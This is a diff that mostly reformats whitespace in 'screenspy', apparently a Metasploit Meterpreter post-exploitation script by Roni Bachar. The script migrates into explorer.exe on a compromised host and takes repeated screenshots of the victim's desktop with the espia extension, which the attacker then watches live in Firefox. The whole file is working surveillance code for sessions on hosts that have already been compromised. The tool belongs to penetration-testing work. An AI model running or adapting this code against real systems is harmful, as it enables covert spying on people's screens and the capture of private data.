@@ -1,7 +1,7 @@
 # $Id$
 # $Revision$
 # Author:Roni Bachar (@roni_bachar) roni.bachar.blog@gmail.com
-# 
+#
 # Thie script will open an interactive view of remote hosts
 # You will need firefox installed on your machine
 
@@ -9,9 +9,9 @@
 require 'fileutils'
 
 opts = Rex::Parser::Arguments.new(
-        "-h" => [ false, "Help menu." ],
-        "-d" => [ true, "The Delay in seconds between each screenshot." ],
-        "-t" => [ true, "The time to run in sec." ],
+	"-h" => [ false, "Help menu." ],
+	"-d" => [ true, "The Delay in seconds between each screenshot." ],
+	"-t" => [ true, "The time to run in sec." ],
 	"-s" => [ true, "The local system linux/windows" ]
 )
 
@@ -22,28 +22,28 @@ meter_type = client.platform
 localsys = "linux"
 
 opts.parse(args) { |opt, idx, val|
-        case opt
-        when '-d'
-                freq = val.to_i
-        when '-t'
-                count = val.to_i
+	case opt
+	when '-d'
+		freq = val.to_i
+	when '-t'
+		count = val.to_i
 	when '-s'
-                localsys = val.to_s
-			
-        when "-h"
+		localsys = val.to_s
+
+	when "-h"
 		print_line
-                print_line "Screenspy v1.0"
-                print_line "--------------"
-		print_line 
+		print_line "Screenspy v1.0"
+		print_line "--------------"
+		print_line
 		print_line
 		print_line "Usage: bgrun screenspy -t 20 -d 1 => will take interactive Screenshot every sec for 20 sec long."
 		print_line "Usage: bgrun screenspy -t 60 -d 5 => will take interactive Screenshot every 5 sec for 1 min long."
 		print_line "Usage: bgrun screenspy -s windows -d 1 -t 60 => will take interactive Screenshot every 1 sec for 1 min long, windows local mode."
 		print_line
 		print_line "Author:Roni Bachar (@roni_bachar) roni.bachar.blog@gmail.com"
-                print_line(opts.usage)
-                raise Rex::Script::Completed
-        end
+		print_line(opts.usage)
+		raise Rex::Script::Completed
+	end
 }
 
 # Wrong Meterpreter Version Message Function
@@ -72,7 +72,7 @@ outfile = ::File.join(Msf::Config.log_directory,file)
 
 begin
 	process2mig = "explorer.exe"
-                    
+
 	# Actual migration
 	mypid = session.sys.process.getpid
 	session.sys.process.get_processes().each do |x|
@@ -100,9 +100,9 @@ begin
 			f2.puts(data)
 		end
 
-	
+
 		if (localsys == "windows")
-	
+
 			print_status("Runing in local mode => windows")
 			print_status("Opening Interactive view...")
 			localcmd="start firefox -width 530 -height 660 \"file:///#{Msf::Config.install_root}/logs/screenshot/#{host}/video.html\""
@@ -111,33 +111,35 @@ begin
 			print_status("Opening Interactive view...")
 			localcmd="bash firefox -width 530 -height 660 \"file:///#{Msf::Config.install_root}/logs/screenshot/#{host}/video.html&\""
 		end
-	
+
 		system (localcmd)
-		(1..count).each do |i|	
+		(1..count).each do |i|
 			sleep(freq) if(i != 1)
 			path = File.join(logs,"screenshot.jpeg")
-                	data = session.espia.espia_image_get_dev_screen
-	
-               		if(data)
-                       		::File.open(path, 'wb') do |fd|
-                              		fd.write(data)
+			data = session.espia.espia_image_get_dev_screen
+
+			if(data)
+				::File.open(path, 'wb') do |fd|
+					fd.write(data)
 					fd.close()
 				end
-                	end
-			
-			
-			
+			end
 		end
+
 	rescue ::Exception => e
 		print_status("Interactive Screenshot Failed: #{e.class} #{e} #{e.backtrace}")
 	end
 
 	print_status("The interactive Session ended...")
-	data="<title>#{host} - Interactive Session ended</title><img src='file:///#{Msf::Config.install_root}/logs/screenshot/#{host}/screenshot.jpeg' width='500' height='500'><script>alert('Interactive Session ended - Happy Hunting')</script>"
-	File.open(path1, 'w') do |f2|  
+	data = <<-EOS
+<title>#{host} - Interactive Session ended</title>
+<img src='file:///#{Msf::Config.install_root}/logs/screenshot/#{host}/screenshot.jpeg' width='500' height='500'>
+<script>alert('Interactive Session ended - Happy Hunting')</script>
+EOS
+	File.open(path1, 'w') do |f2|
 		f2.puts(data)
- 	end  
-	
+	end
+
 rescue ::Exception => e
 	print_status("Exception: #{e.class} #{e} #{e.backtrace}")
 end
